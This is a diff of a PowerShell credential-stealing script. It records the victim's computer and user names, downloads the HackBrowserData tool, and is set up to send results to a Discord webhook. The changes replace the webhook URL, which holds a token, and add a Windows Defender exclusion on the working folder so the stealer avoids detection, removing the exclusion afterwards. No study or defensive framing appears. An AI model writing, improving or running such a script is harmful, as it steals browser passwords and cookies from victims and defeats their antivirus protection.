@@ -1,5 +1,5 @@
 # Discord Webhook
-$webhook = "https://discord.com/api/webhooks/1467247495896895670/3AcT2XWey8Wi69lE52j_kW5SJK-GHKsNebUpB42sJO0ldLMhwU7QMMRLhquT6wPYMET3"
+$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"
 
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
@@ -22,6 +22,9 @@ $tempDir = "$env:TEMP\hbd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
+    # Add temp directory to Windows Defender exclusion
+    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+    
     # Download HackBrowserData
     $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
@@ -65,6 +68,7 @@ try {
 }
 
 # Clean up
+Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # === Format and Send ===
